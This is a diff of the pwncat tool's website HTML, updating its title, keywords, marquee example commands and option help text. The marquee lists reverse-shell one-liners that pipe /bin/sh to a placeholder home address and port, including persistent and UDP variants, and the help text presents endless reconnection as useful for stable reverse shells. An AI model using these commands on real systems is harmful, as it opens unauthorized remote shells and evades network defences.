@@ -5,8 +5,8 @@
 	<meta name="viewport" content="width=device-width, initial-scale=1">
 	<meta name="author" content="cytopia">
 	<meta name="description" content="Pwncat - Netcat on steroids with Firewall, IDS/IPS evasion, bind and reverse shell, self-injecting shell and port forwarding magic - and its fully scriptable with Python">
-	<meta name="keywords" content="pwncat, netcat, reverse shell, bind shell, unbreakable reverse shell, UDP reverse shell, pwncat scripting engine, IDS evasion, IPS evasion, Firewall evasion">
-	<title>pwncat</title>
+	<meta name="keywords" content="pwncat, reverse shell, bind shell, inject shell, unbreakable reverse shell, UDP reverse shell, pwncat scripting engine, IDS evasion, IPS evasion, Firewall evasion, netcat">
+	<title>pwncat - reverse shell, bind shell, inject shell and port forwarding</title>
 	<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/mini.css/3.0.1/mini-default.min.css">
 	<script async src="https://www.googletagmanager.com/gtag/js?id=UA-60914146-3"></script>
 	<style>
@@ -82,11 +82,11 @@
 		<marquee behavior="alternate">
 			<small>
 				<code class="hi">pwncat -n -e /bin/sh {home-addr} {home-port}</code> ##########
-				<code class="hi">pwncat -n --recon -1 --recon-robin 4000-4100 -e /bin/sh {home-addr} {home-port}</code> ##########
+				<code class="hi">pwncat -n --reconn --recon-robin 4000-4100 -e /bin/sh {home-addr} {home-port}</code> ##########
 				<code class="hi">pwncat -n --udp --udp-ping-intvl 30 -e /bin/sh {home-addr} {home-port}</code> ##########
 				<code class="hi">pwncat -n --safe-word 'all your base are belong to us' --udp --udp-ping-intvl 2 -e /bin/sh {home-addr} {home-port}</code> ##########
 				<code class="hi">pwncat -l -vvv 4444 2&gt; comm.txt</code> ##########
-				<code class="hi">pwncat -u --reconn -1 -R 56.0.0.1:4444 10.0.0.1 3306</code>
+				<code class="hi">pwncat -u --reconn -R 56.0.0.1:4444 10.0.0.1 3306</code>
 			</small>
 		</marquee>
 	</header>
@@ -175,6 +175,7 @@ mode arguments:
 </pre>
 <pre class="hi">
 optional arguments:
+  -6                    Use IPv6 instead of IPv4.
   -e cmd, --exec cmd    Execute shell command. Only for connect or listen mode.
   -C lf, --crlf lf      Specify, 'lf', 'crlf' or 'cr' to always force replacing
                         line endings for input and outout accordingly. Specify
@@ -255,10 +256,13 @@ advanced arguments:
                         disconnected or the connection is unterrupted otherwise.
                         (default: server will quit after connection is gone)
 
-  --rebind x            Listen mode (TCP and UDP):
+  --rebind [x]          Listen mode (TCP and UDP):
                         If the server is unable to bind, it will re-initialize
-                        itself x many times before giving up. Use -1 to re-init
-                        endlessly. (default: fail after first unsuccessful try).
+                        itself x many times before giving up. Omit the
+                        quantifier to rebind endlessly or specify a positive
+                        integer for how many times to rebind before giving up.
+                        See --rebind-robin for an interesting use-case.
+                        (default: fail after first unsuccessful try).
 
   --rebind-wait s       Listen mode (TCP and UDP):
                         Wait x seconds between re-initialization. (default: 1)
@@ -271,10 +275,12 @@ advanced arguments:
                         Set --rebind to at least the number of ports to probe +1
                         This option requires --rebind to be specified.
 
-  --reconn x            Connect mode / Zero-I/O mode (TCP only):
+  --reconn [x]          Connect mode / Zero-I/O mode (TCP only):
                         If the remote server is not reachable or the connection
                         is interrupted, the client will connect again x many
-                        times before giving up. Use -1 to retry endlessly.
+                        times before giving up. Omit the quantifier to retry
+                        endlessly or specify a positive integer for how many
+                        times to retry before giving up.
                         (default: quit if the remote is not available or the
                         connection was interrupted)
                         This might be handy for stable TCP reverse shells ;-)
